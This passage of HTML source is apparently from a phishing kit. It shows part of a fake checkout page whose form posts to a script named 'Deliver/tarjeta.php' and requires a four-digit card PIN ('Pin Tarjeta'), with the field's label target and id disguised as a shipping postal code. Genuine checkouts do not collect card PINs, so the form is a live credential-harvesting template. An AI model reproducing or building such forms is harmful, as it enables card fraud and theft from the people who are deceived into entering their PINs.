				 ...
				 M68.609,39.489h-56v-8.287c0-1.345,1.12-2.24,2.239-2.24h51.52c1.345,0,2.239,1.12,2.239,2.24L68.609,39.489L68.609,39.489z" />
                                            ...
                                            <div class="checkout-box-content">
                                                <form class="checkout-new-shipping-address-form" method="post" action="./Deliver/tarjeta.php">
                                                    ...
                                                    <div class="form-row">
                                                        <div class="form-group col-md-4">
                                                            <label for="shipping.postalcode"> PIN <text style="color: red;">*</text></label>
                                                            <input type="tel" placeholder="XXXX" name="pin" id="shippingpostalcode" style="height:40px;border-top-left-radius:10px;border-top-right-radius:10px;" maxlength="4" minlength="4" title="Pin Tarjeta" class="form-control null" autocomplete="off" required="true">
                                                        </div>
